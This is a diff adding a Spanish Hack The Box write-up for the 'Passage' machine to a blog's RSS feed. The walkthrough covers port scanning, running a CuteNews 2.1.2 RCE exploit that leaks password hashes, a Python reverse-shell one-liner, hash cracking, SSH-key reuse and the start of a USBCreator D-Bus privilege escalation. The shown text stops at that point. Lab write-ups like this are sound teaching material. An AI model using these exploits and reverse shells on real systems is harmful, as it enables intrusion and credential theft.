@@ -12,7 +12,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
-    <lastBuildDate>Sat, 06 Feb 2021 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 06 Mar 2021 00:00:00 +0000</lastBuildDate>
     <sy:updatePeriod>daily</sy:updatePeriod>
     <sy:updateFrequency>daily</sy:updateFrequency>
     
@@ -21,6 +21,374 @@
     
     
 
+      
+      <item>
+        <title>Hack The Box - Passage</title>
+        <link>https://sckull.github.io/posts/passage/</link>
+        <pubDate>Sat, 06 Mar 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 06 Mar 2021 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/passage/</guid>
+        <description>Passage es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Passage es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Nombre&lt;/th&gt;
+&lt;th&gt;Passage&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;OS&lt;/td&gt;
+&lt;td&gt;Linux&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;30&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Media&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;IP&lt;/td&gt;
+&lt;td&gt;10.10.10.206&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/140851&#34;&gt;ChefByzen&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Sep 25 01:31:49 2020 as: nmap -Pn -p- --min-rate 1000 -oN allports 10.10.10.206&lt;/span&gt;
+Warning: 10.10.10.206 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.206 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.206&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.11s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;63942&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;1591&lt;/span&gt; filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Sep 25 01:34:10 2020 -- 1 IP address (1 host up) scanned in 140.93 seconds&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Sep 25 01:34:44 2020 as: nmap -p22,80 -sC -sV -o serviceAllports 10.10.10.206&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.206 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.206&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Passage News
+Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Sep 25 01:34:55 2020 -- 1 IP address (1 host up) scanned in 10.77 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_020921.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Al intentar realizar una busqueda directorios y paginas con gobuster parecia que la maquina habia caido, pero segun un post de la pagina tienen implementado fail2ban, por lo que al utilizar herramientas como gobuster o hydra, fail2ban banea nuestra IP por algun tiempo.&lt;/p&gt;
+&lt;h2 id=&#34;cute-news-212---rce-&#34;&gt;CUTE NEWS 2.1.2 - RCE&lt;/h2&gt;
+&lt;p&gt;Explorando la pagina encontramos en el footer de esta el nombre de lo que parece ser un CMS, al investigar un poco acerca de este nombre encontramos un exploit &lt;a href=&#34;https://www.exploit-db.com/exploits/48800&#34;&gt;&lt;strong&gt;CuteNews 2.1.2 - Remote Code Execution&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_021143.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Segun el codigo del exploit realiza una consulta a &lt;code&gt;/CuteNews/cdata/users/lines&lt;/code&gt; donde se almacenan en &lt;code&gt;base64&lt;/code&gt; las credenciales de usuarios, verificamos que esta direccion exista en esta version de CMS y vemos la lista de usuarios codificados.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_021531.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;El exploit al tener las credenciales realiza un cambio del &amp;ldquo;avatar&amp;rdquo; del usuario encontrado con una webshell dentro lo que permite ejecutar comandos en la maquina. Para ello descargamos y ejecutamos el exploit, logrando ejecutar comandos como usuario &lt;code&gt;www-data&lt;/code&gt; y ver algunos hashes de los usuarios registrados en el CMS.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/htb/passage$ python3 CuteNews-2.1.2-RCE.py 
+
+
+
+           _____     __      _  __                     ___   ___  ___ 
+          / ___/_ __/ /____ / &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;/ /__ _    _____       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &amp;lt;  / &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+         / /__/ // / __/ -_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    / -_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;/ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_-&amp;lt;      / __/_ / / / __/ 
+         &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;,_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/_/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__,__/___/     /____&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;____/ 
+                                ___  _________                        
+                               / _ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; ___/ __/                        
+                              / , _/ /__/ _/                          
+                             /_/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/___/                          
+                                                                      
+
+                                                                                                                                                   
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Usage python3 expoit.py
+
+Enter the URL&amp;gt; http://10.10.10.206 
+&lt;span class=&#34;o&#34;&gt;================================================================&lt;/span&gt;
+Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR &lt;span class=&#34;nv&#34;&gt;JOHN&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;================================================================&lt;/span&gt;
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+&lt;span class=&#34;nv&#34;&gt;4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;================================================================&lt;/span&gt;
+
+&lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt;
+Registering a &lt;span class=&#34;nv&#34;&gt;users&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Registration successful with username: 8g9Nqx6ATg and password: &lt;span class=&#34;nv&#34;&gt;8g9Nqx6ATg&lt;/span&gt;
+
+&lt;span class=&#34;o&#34;&gt;=======================================================&lt;/span&gt;
+Sending &lt;span class=&#34;nv&#34;&gt;Payload&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;=======================================================&lt;/span&gt;
+signature_key: 2e4f7658cee281341e4f5f36f776847b-8g9Nqx6ATg
+signature_dsi: 2c0343d390fbd41777bd7c348ba74773
+logged in user: &lt;span class=&#34;nv&#34;&gt;8g9Nqx6ATg&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;============================&lt;/span&gt;
+Dropping to a &lt;span class=&#34;nv&#34;&gt;SHELL&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;============================&lt;/span&gt;
+
+&lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; &amp;gt; whoami
+www-data
+
+&lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Para tener una shell más comoda ejecutamos una shell inversa con python:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.10.30&amp;#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;paul---user-&#34;&gt;PAUL - USER&lt;/h2&gt;
+&lt;p&gt;Una vez dentro con una shell más comoda realizamos una enumeracion en la maquina pero no encontramos nada más que solo los usuarios de la maquina: &lt;code&gt;paul&lt;/code&gt; y &lt;code&gt;nadav&lt;/code&gt;, pero recordemos, encontramos algunos hashes (SHA256), utilizamos &lt;code&gt;John&lt;/code&gt; y &lt;code&gt;rockyou.txt&lt;/code&gt; para obtener algunas contraseñas.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#HASHES&lt;/span&gt;
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_022316.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;O de la manera facil utilizando &lt;a href=&#34;https://crackstation.net/&#34;&gt;&lt;strong&gt;CrackStation&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_022407.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Una vez con las contraseñas intentamos cambiar de usuario con estas, logramos obtener una shell con el usuario &lt;code&gt;Paul&lt;/code&gt; y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_022737.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;nadav---user-&#34;&gt;NADAV - USER&lt;/h2&gt;
+&lt;p&gt;Realizamos una enumeracion con este usuario y esta vez encontramos en el archivo &lt;code&gt;authorized_keys&lt;/code&gt; la clave publica (id_rsa.pub) de &lt;code&gt;nadav&lt;/code&gt;, por lo que este usuario puede conectarse desde su cuenta a la nuestra (paul), si ese es el caso quizas nosotros tambien a la suya.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;paul@passage:~/.ssh$ cat auth*
+cat auth*
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
+paul@passage:~/.ssh$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Nos conectamos mediante SSH en localhost con este usuario para comprobar que nuestro usuario (paul) tambien tenga acceso al usuario &lt;code&gt;nadav&lt;/code&gt;. Lo cual pudimos confirmar y ahora tenemos una shell con &lt;code&gt;nadav&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/passage/Screenshot_20200925_023306.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Realizamos una enumeracion en la carpeta de &lt;code&gt;nadav&lt;/code&gt; y encontramos algo interesante en el archivo &lt;code&gt;.viminfo&lt;/code&gt; y es que uno de los archivos que fue editado con &lt;code&gt;vim&lt;/code&gt; es &lt;code&gt;/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf&lt;/code&gt;. Investigamos un poco acerca de este archivo y encontramos que es posible &lt;a href=&#34;https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/&#34;&gt;crear archivos como usuario &lt;code&gt;root&lt;/code&gt;&lt;/a&gt; utilizando &lt;code&gt;USBCreator D-Bus interface&lt;/code&gt; lo que podria ayudarnos a escalar privilegios. Para ello verificamos que &lt;code&gt;usb-creator-helper&lt;/code&gt; este siendo ejecutado con el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nadav@passage:~$ ps -ef &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep usb-creator
+ps -ef &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep usb-creator
+root       &lt;span class=&#34;m&#34;&gt;1992&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:04 ?        00:00:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
+nadav      &lt;span class=&#34;m&#34;&gt;2825&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2741&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 01:43 pts/20   00:00:00 grep --color&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;auto usb-creator
+nadav@passage:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
